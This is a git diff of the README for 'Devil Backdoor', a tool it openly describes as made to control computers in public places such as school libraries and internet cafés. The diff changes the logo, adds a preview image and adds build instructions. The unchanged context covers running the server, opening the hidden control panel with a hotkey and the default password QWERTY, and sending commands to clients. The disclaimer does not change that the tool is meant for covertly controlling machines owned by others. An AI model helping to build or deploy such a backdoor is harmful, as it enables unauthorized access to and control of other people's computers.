@@ -1,8 +1,10 @@
-# ![Devil Logo](https://github.com/Kirlovon/Devil-Backdoor/raw/master/icon.ico) Devil Backdoor 
+# ![Devil Logo](https://github.com/Kirlovon/Devil-Backdoor/raw/master/assets/logo.png) Devil Backdoor 
 
 [![license](https://img.shields.io/github/license/Kirlovon/Devil-Backdoor.svg)](https://github.com/Kirlovon/Devil-Backdoor/blob/master/LICENSE)
 [![GitHub repo size in bytes](https://img.shields.io/github/repo-size/Kirlovon/Devil-Backdoor.svg)](https://github.com/Kirlovon/Devil-Backdoor)
 [![GitHub last commit](https://img.shields.io/github/last-commit/Kirlovon/Devil-Backdoor.svg)](https://github.com/Kirlovon/Devil-Backdoor/commits/master)
+
+ ![Devil Logo](https://github.com/Kirlovon/Devil-Backdoor/raw/master/assets/preview.png)
 
 This is a simple backdoor made to control computers in various public places, like school library, internet café, and so on.
 
@@ -39,6 +41,9 @@ Save config file, and run **Devil-Server.exe**! If you put **True** in the **Add
 Run **Devil-ControlPanel.exe**.
 If you fill **ControlPanelPatch** option in config file, you can press Hotkey to run Control Panel, _( Default hotkey is **PAUSE** )_ and enter the password specified in the code. _(Default is **QWERTY**)_ <br/>
 Next, in the window that appears, select the shared folder. When the interface appears, in the inputbox type the _ClientID_ to select client, that will receive the command.
+
+## Building
+In **Build** folder you can find 2 files: **build_x86.cmd** and **build_x64.cmd**. Run one of this files, to build backdoor.
 
 ***
 ###### Devil-Backdoor project is for informational purposes only! You take full responsibility for using this sofware!
